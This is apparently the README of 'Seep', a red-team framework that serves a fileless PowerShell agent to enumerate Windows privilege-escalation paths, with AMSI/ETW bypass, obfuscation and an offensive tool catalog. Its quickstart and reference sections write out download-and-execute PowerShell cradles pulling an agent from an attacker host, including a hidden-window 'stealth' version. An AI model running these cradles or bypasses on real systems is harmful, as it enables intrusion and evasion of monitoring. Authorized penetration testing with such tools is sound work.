<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-light.svg">
  <img alt="Seep" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg" width="100%">
</picture>

> [!IMPORTANT]
> **Windows privilege escalation enumeration with fileless agent.** 16 checks, 97 tools, MITRE ATT&CK mapping with single-file HTML reports. Discovers misconfigurations, credential exposures, and escalation paths through comprehensive enumeration across 7 categories.

> *A seep is water that finds its way through the smallest cracks and porous materials, slowly but persistently reaching where it shouldn't. Perfect metaphor for privilege escalation enumeration—finding those tiny misconfigurations and vulnerabilities that allow privilege to seep through system boundaries.*

---

## §1 / Premise

Seep is a **Windows privilege escalation enumeration framework** designed for comprehensive discovery of misconfigurations and vulnerabilities. Deploy a fileless PowerShell agent that executes 16 modular checks across system configuration, user privileges, services, patches, and registry analysis.

The framework orchestrates enumeration through a Python CLI that composes custom agents, serves 97 tools across 7 categories, and generates single-file HTML reports with MITRE ATT&CK mappings. Agent runs entirely in memory with AMSI/ETW bypasses, AES-256 encrypted uploads, and zero disk footprint.

**Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

---

## §2 / Specs

| KEY            | VALUE                                                                       |
|----------------|-----------------------------------------------------------------------------|
| **ENUMERATION** | **16 check modules · system · privileges · network · patches · registry** |
| **TOOLS**      | **97-tool catalog** across 7 categories with SHA256 verification |
| **AGENT**      | **Fileless PowerShell execution** with AMSI/ETW bypass and obfuscation |
| **FRAMEWORK**  | **Python CLI orchestration · composition · serving · reporting** |
| **ATTACK**     | **MITRE ATT&CK mapping** with actionable exploitation guidance |
| **REPORTS**    | **Single-file HTML** with dark theme, no CDN dependencies |
| **CRYPTO**     | **AES-256-CBC encryption** with GZip compression for result uploads |
| **PLATFORM**   | **Python 3.9+ CLI · PowerShell 3.0+ agent · Windows 8+ targets** |

---

## §3 / Quickstart

**Prerequisites:** Python 3.9+ (attack box), PowerShell 3.0+ (target)

```bash
# Install framework
pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# Initialize workspace and serve agent
seep init --workdir /tmp/op1
seep serve --workdir /tmp/op1

# Execute on target (server provides ready-to-use cradles)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Generate HTML report from results
seep report /tmp/op1/results/results_*.json --format html --output report.html
```

---

## §4 / Reference

```bash
# AGENT COMPOSITION
seep compose --output agent.ps1                           # Full agent (all 16 checks)
seep compose --checks system_info,user_privileges --output quick.ps1  # Minimal agent
seep compose --obfuscate --output obf_agent.ps1          # Obfuscated identifiers

# TOOL CATALOG MANAGEMENT
seep catalog list                                         # List all 97 tools
seep catalog list --category TokenAbuse                  # Filter by category
seep catalog download --all --workdir /tmp/op1           # Download with verification
seep catalog verify --workdir /tmp/op1                   # SHA256 integrity check

# SERVER & DELIVERY
seep serve --workdir /tmp/op1 --port 80 --upload-port 8000  # HTTP serving
seep serve --workdir /tmp/op1 --tls                      # HTTPS with self-signed cert

# STEALTH EXECUTION
powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# REPORT GENERATION
seep report results.json --format html --output report.html  # Single-file HTML
seep report results.json --format md --output report.md      # Markdown format
seep report results.json --format json                       # JSON summary

# CHECK CATEGORIES
system_info user_privileges network patches quick_wins
unattend_files web_configs services scheduled_tasks autoruns
alwaysinstallelevated software processes dll_hijack
directory_tree registry_secrets
```

---

## §5 / Architecture

**Three-Layer Design**: Python CLI orchestration → PowerShell agent composition → Encrypted result upload

```
server/
├── cli.py              # Click-style CLI (init, serve, catalog, compose, report)
├── agent/
│   ├── checks/         # 16 PowerShell check modules with metadata headers
│   ├── templates/      # Agent wrapper (Invoke-Seep entry point)
│   └── composer.py     # Assembles checks, identifier randomization
├── catalog/
│   ├── tools.yaml      # 97 tool definitions (SHA256, categories, MITRE)
│   └── manager.py      # Download, verify, symlinks, update check
├── http/
│   ├── serve.py        # HTTP handler (agent delivery, tool serving, upload)
│   └── tls.py          # Self-signed cert generation
├── results/
│   └── parser.py       # JSON/ZIP upload parsing, schema validation
└── report/
    ├── recommendations.py  # Finding-to-tool mapping with ATT&CK
    └── generator.py        # HTML, Markdown, JSON report generation
```

**Tool Categories**: Enumeration (27), Credentials (12), TokenAbuse (10), AD (16), Tunneling (9), Impacket (18), Shells (5) — distributed via GitHub Releases with integrity verification.

---

## §6 / Authorization

Seep is designed for **authorized Windows security testing** with explicit written permission. The tool generates significant network traffic and PowerShell activity that will be logged by Windows Event Log and monitoring solutions.

Security vulnerabilities should be reported via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Seep/security/advisories) with 90-day responsible disclosure.

**Seep does not**: exploit discovered misconfigurations, maintain persistent access, destroy evidence, tamper with logs, or guarantee evasion of advanced monitoring solutions.

---

**Real-Fruit-Snacks** — [All projects](https://real-fruit-snacks.github.io/) · [Security](https://github.com/Real-Fruit-Snacks/Seep/security/advisories) · [License](LICENSE)